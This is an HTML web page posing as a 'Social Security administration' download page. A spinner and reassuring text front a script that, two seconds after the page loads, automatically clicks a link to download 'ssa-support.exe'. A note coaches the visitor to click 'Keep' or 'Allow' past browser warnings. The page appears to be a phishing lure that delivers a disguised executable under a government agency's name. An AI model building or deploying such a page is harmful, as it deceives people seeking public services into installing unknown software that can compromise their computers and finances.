<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Downloading Social Security administration...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border-left-color: #3b82f6;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-gray-50 flex items-center justify-center min-h-screen font-sans text-gray-800 p-4">
    <div class="bg-white p-8 rounded-2xl shadow-xl max-w-md w-full text-center border border-gray-100">
        <div class="flex justify-center mb-6">
            <div class="spinner"></div>
        </div>
        <h1 class="text-2xl font-bold text-gray-900 mb-2">Downloading Social Security administration...</h1>
        <p class="text-gray-500 mb-6">Your download will start automatically in a moment. Please wait.</p>
        <div class="bg-blue-50 text-blue-800 p-4 rounded-lg mb-6 text-sm text-left">
            <strong>Note:</strong> Depending on your browser settings, you may need to click "Keep" or "Allow" to save the file.
        </div>
        <p class="text-sm text-gray-400">
            If your download doesn't start, 
            <a href="ssa-support.exe" download="ssa-support.exe" id="manual-download" class="text-blue-600 hover:underline font-semibold">
                click here to download manually
            </a>.
        </p>
    </div>
    <script>
        window.onload = function() {
            setTimeout(function() {
                document.getElementById('manual-download').click();
            }, 2000);
        };
    </script>
</body>
</html>
